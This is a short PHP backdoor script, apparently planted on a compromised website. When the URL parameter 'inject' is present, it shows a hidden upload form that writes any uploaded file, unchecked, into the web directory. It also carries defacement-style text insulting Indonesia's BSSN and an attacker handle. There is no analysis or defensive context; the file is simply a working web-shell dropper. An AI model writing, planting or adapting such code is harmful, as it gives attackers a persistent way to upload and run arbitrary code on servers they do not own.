<?php 
if(isset($_GET['inject']))
{ 
if(isset($_POST['cekfile']))
{
move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
echo "Upload Berhasil";
}
else
{
echo '<form enctype="multipart/form-data" action="" method="post">
<h3><u>Fuck You "BSSN.GO.ID".</u></h3>
Oleh : Xcod3bughunt3r - www.itsecurity.id <br />Nama file : <input type="file" name="file" />
<br /><input name="cekfile" type="submit" value="Upload"></form>';
 } 
 }
?>
